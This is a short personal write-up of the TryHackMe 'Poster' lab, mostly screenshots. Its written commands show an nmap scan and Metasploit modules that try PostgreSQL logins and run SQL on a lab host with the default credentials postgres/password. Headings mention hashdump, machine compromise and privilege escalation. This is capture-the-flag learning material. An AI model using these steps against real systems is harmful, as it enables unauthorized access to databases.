Poster Tryhackme 14/12/2024
(This is a personal writeup to be consulted later)

#Enumeration  
We scan with nmap to see open ports and services :  
![image](https://github.com/user-attachments/assets/0670ef7a-bdc1-441b-b65d-250cd200c95f)  

I open the metasploit , i type 'search postgresql' : 
![image](https://github.com/user-attachments/assets/03471555-b423-4155-893c-3890fc0940b7)  

type 'use auxiliary/scanner/postgres/postgres_login '  

then 
'set RHOSTS 10.10.249.77'

'run'  

![image](https://github.com/user-attachments/assets/ffee311b-b3c1-4876-b2da-f46d44bca99e)  


use auxiliary/admin/postgres/postgres_sql  
set RHOSTS 10.10.249.77  
set RPORT 5432  
set USERNAME postgres  
set PASSWORD password  
set SQL "SELECT version();"  
![image](https://github.com/user-attachments/assets/33d355c9-dc43-4dc5-a4d2-466e4b916740)  

Hashdump :   
![image](https://github.com/user-attachments/assets/f7154faa-fbb9-4807-bd40-2933297bc893)  

using 'search postgresql' we can this 2 answers :  
![image](https://github.com/user-attachments/assets/cbbcb452-f879-441b-885e-2b548c939b5d)  

Compromise the machine  :  
![image](https://github.com/user-attachments/assets/80f6aeca-e851-44f6-8931-e88f4146a340)  

![image](https://github.com/user-attachments/assets/1293c58d-cfeb-4b37-b934-9f8d33c57e53)  
![image](https://github.com/user-attachments/assets/c07417c5-eaf6-466c-b6fe-f21ddb6143c4)  

![image](https://github.com/user-attachments/assets/42be3cba-4168-41dc-9c3f-84dba9b3cd57)  

![image](https://github.com/user-attachments/assets/28d93161-a1cf-4e09-b264-d8680429d582)  

![image](https://github.com/user-attachments/assets/21573c52-0375-41b9-9cf0-9fe508b0993f)  
![image](https://github.com/user-attachments/assets/b5e0a501-45bb-486d-9ec0-23847483417a)  

Now is time for Privilege Escalation to get the Root  
![image](https://github.com/user-attachments/assets/bcc14694-e2fb-49cd-8687-3ed9b278ea3c)  
